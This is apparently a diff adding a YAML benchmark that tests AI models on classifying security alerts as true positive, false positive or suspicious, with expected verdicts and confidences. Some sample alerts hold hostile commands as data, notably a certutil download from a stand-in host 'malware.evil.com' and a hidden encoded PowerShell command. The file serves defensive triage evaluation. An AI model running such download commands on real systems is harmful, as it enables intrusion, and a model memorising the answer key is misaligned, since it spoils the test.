@@ -1,0 +1,285 @@
+name: "Verdict Classification Benchmark"
+task_type: verdict_classification
+description: >
+  Evaluate AI models on their ability to classify security alerts as
+  true_positive, false_positive, suspicious, or inconclusive.
+version: "1.0"
+metadata:
+  created: "2024-01-15"
+  source: "Triage Warden historical incidents"
+  categories:
+    - phishing
+    - malware
+    - legitimate
+    - suspicious_login
+    - c2
+
+examples:
+  # True Positive - Phishing
+  - id: vc_tp_001
+    task_type: verdict_classification
+    difficulty: easy
+    category: phishing
+    tags: [credential-theft, spoofing, email]
+    input:
+      alert_type: email_security
+      subject: "Urgent: Your account has been compromised - verify now"
+      sender: "security@paypa1-alerts.com"
+      sender_display_name: "PayPal Security Team"
+      sender_domain_age_days: 3
+      contains_link: true
+      link_domain: "paypal-secure-login.xyz"
+      link_url_path: "/verify/account?token=abc123"
+      recipient: "finance.user@company.com"
+      attachments: []
+      spf_result: "fail"
+      dkim_result: "none"
+    expected:
+      verdict: true_positive
+      confidence: 95
+
+  - id: vc_tp_002
+    task_type: verdict_classification
+    difficulty: medium
+    category: phishing
+    tags: [bec, impersonation, wire-fraud]
+    input:
+      alert_type: email_security
+      subject: "RE: Urgent Wire Transfer Request"
+      sender: "ceo.name@company-secure.net"
+      sender_display_name: "John Smith (CEO)"
+      sender_domain_age_days: 7
+      contains_link: false
+      recipient: "accounts.payable@company.com"
+      body_preview: "I need you to process an urgent wire transfer of $125,000 to our new vendor..."
+      reply_to: "ceo.personal@gmail.com"
+      from_header_mismatch: true
+      spf_result: "pass"
+    expected:
+      verdict: true_positive
+      confidence: 90
+
+  # True Positive - Malware
+  - id: vc_tp_003
+    task_type: verdict_classification
+    difficulty: medium
+    category: malware
+    tags: [powershell, encoded-command, outlook-spawn]
+    input:
+      alert_type: endpoint_detection
+      process_name: "powershell.exe"
+      command_line: "powershell.exe -NoP -NonI -W Hidden -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAANQA="
+      parent_process: "outlook.exe"
+      parent_command_line: "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\""
+      user: "domain\\user1"
+      network_connections:
+        - dest_ip: "185.234.72.14"
+          dest_port: 443
+          bytes_sent: 1024
+    expected:
+      verdict: true_positive
+      confidence: 85
+
+  - id: vc_tp_004
+    task_type: verdict_classification
+    difficulty: hard
+    category: malware
+    tags: [lolbin, certutil, download]
+    input:
+      alert_type: endpoint_detection
+      process_name: "certutil.exe"
+      command_line: "certutil.exe -urlcache -split -f http://malware.evil.com/payload.exe C:\\Users\\Public\\update.exe"
+      parent_process: "cmd.exe"
+      parent_command_line: "cmd.exe /c certutil..."
+      user: "domain\\user2"
+      file_written: "C:\\Users\\Public\\update.exe"
+      file_hash_sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+    expected:
+      verdict: true_positive
+      confidence: 92
+
+  - id: vc_tp_005
+    task_type: verdict_classification
+    difficulty: medium
+    category: c2
+    tags: [cobalt-strike, beacon, network]
+    input:
+      alert_type: network_ids
+      source_ip: "10.0.1.50"
+      source_hostname: "WORKSTATION-42"
+      dest_ip: "89.248.165.200"
+      dest_port: 443
+      bytes_sent: 1024000
+      bytes_received: 50000
+      signature: "ET TROJAN Cobalt Strike Beacon Activity"
+      ssl_cert_subject: "CN=cloudflare.com"
+      jarm_hash: "2ad2ad0002ad2ad00042d42d00000069d641f34fe76acdc05c40262f8815e5"
+      timestamp: "2024-01-15T02:30:00Z"
+    expected:
+      verdict: true_positive
+      confidence: 90
+
+  # False Positive - Legitimate
+  - id: vc_fp_001
+    task_type: verdict_classification
+    difficulty: easy
+    category: legitimate
+    tags: [shipping, notification, email]
+    input:
+      alert_type: email_security
+      subject: "Your order has shipped"
+      sender: "ship-confirm@amazon.com"
+      sender_display_name: "Amazon.com"
+      sender_domain_age_days: 8500
+      contains_link: true
+      link_domain: "amazon.com"
+      link_url_path: "/gp/your-orders/tracking?orderID=123-456"
+      recipient: "user@company.com"
+      spf_result: "pass"
+      dkim_result: "pass"
+      dmarc_result: "pass"
+    expected:
+      verdict: false_positive
+      confidence: 95
+
+  - id: vc_fp_002
+    task_type: verdict_classification
+    difficulty: easy
+    category: legitimate
+    tags: [windows-service, system-process]
+    input:
+      alert_type: endpoint_detection
+      process_name: "svchost.exe"
+      command_line: "C:\\Windows\\System32\\svchost.exe -k netsvcs -p"
+      parent_process: "services.exe"
+      parent_command_line: "C:\\Windows\\System32\\services.exe"
+      user: "NT AUTHORITY\\SYSTEM"
+      network_connections: []
+      signed: true
+      signer: "Microsoft Windows"
+    expected:
+      verdict: false_positive
+      confidence: 95
+
+  - id: vc_fp_003
+    task_type: verdict_classification
+    difficulty: medium
+    category: legitimate
+    tags: [admin-activity, powershell, scheduled-task]
+    input:
+      alert_type: endpoint_detection
+      process_name: "powershell.exe"
+      command_line: "powershell.exe -ExecutionPolicy Bypass -File C:\\Admin\\Scripts\\backup.ps1"
+      parent_process: "taskeng.exe"
+      user: "domain\\backup_svc"
+      timestamp: "2024-01-15T03:00:00Z"
+      known_scheduled_task: "Daily Backup"
+      network_connections:
+        - dest_ip: "10.0.2.100"
+          dest_port: 445
+          direction: "outbound"
+    expected:
+      verdict: false_positive
+      confidence: 85
+
+  - id: vc_fp_004
+    task_type: verdict_classification
+    difficulty: medium
+    category: legitimate
+    tags: [security-tool, scanning, vulnerability]
+    input:
+      alert_type: network_ids
+      source_ip: "10.0.10.50"
+      source_hostname: "NESSUS-SCANNER"
+      dest_ip: "10.0.1.25"
+      dest_port: 445
+      signature: "ET SCAN Potential VNC Scan"
+      asset_tag: "security_scanner"
+      scan_window_active: true
+      authorized_scanner: true
+    expected:
+      verdict: false_positive
+      confidence: 90
+
+  - id: vc_fp_005
+    task_type: verdict_classification
+    difficulty: hard
+    category: legitimate
+    tags: [developer, debugging, legitimate-tool]
+    input:
+      alert_type: endpoint_detection
+      process_name: "mimikatz.exe"
+      command_line: "mimikatz.exe"
+      parent_process: "cmd.exe"
+      user: "domain\\security_analyst"
+      user_department: "Security Operations"
+      machine_type: "security_workstation"
+      approved_tool_list: ["mimikatz", "bloodhound", "cobalt-strike"]
+      ticket_reference: "SEC-2024-0042"
+    expected:
+      verdict: false_positive
+      confidence: 75
+
+  # Suspicious - Needs Investigation
+  - id: vc_sus_001
+    task_type: verdict_classification
+    difficulty: medium
+    category: suspicious_login
+    tags: [anomalous-login, impossible-travel]
+    input:
+      alert_type: authentication
+      user: "john.doe@company.com"
+      auth_result: "success"
+      source_ip: "89.40.215.100"
+      source_geo: "Romania"
+      source_isp: "Unknown VPS Provider"
+      previous_login_location: "New York, USA"
+      time_since_last_login_minutes: 45
+      user_typical_locations: ["New York", "Boston"]
+      mfa_used: true
+      mfa_type: "push_notification"
+    expected:
+      verdict: suspicious
+      confidence: 70
+
+  - id: vc_sus_002
+    task_type: verdict_classification
+    difficulty: hard
+    category: malware
+    tags: [encrypted-payload, unknown-binary]
+    input:
+      alert_type: endpoint_detection
+      process_name: "update.exe"
+      file_path: "C:\\ProgramData\\Microsoft\\Windows\\update.exe"
+      parent_process: "explorer.exe"
+      user: "domain\\user3"
+      file_signed: false
+      file_hash_sha256: "unique_unknown_hash_123"
+      file_entropy: 7.8
+      vt_detection_ratio: "0/60"
+      first_seen: true
+      network_connections: []
+    expected:
+      verdict: suspicious
+      confidence: 65
+
+  - id: vc_sus_003
+    task_type: verdict_classification
+    difficulty: medium
+    category: phishing
+    tags: [typosquatting, subtle-spoof]
+    input:
+      alert_type: email_security
+      subject: "Invoice #45892 - Payment Due"
+      sender: "accounting@micros0ft-billing.com"
+      sender_display_name: "Microsoft Billing"
+      sender_domain_age_days: 30
+      contains_link: true
+      link_domain: "micros0ft-billing.com"
+      attachment_name: "invoice_45892.pdf"
+      attachment_type: "application/pdf"
+      spf_result: "pass"
+      dkim_result: "pass"
+    expected:
+      verdict: suspicious
+      confidence: 75
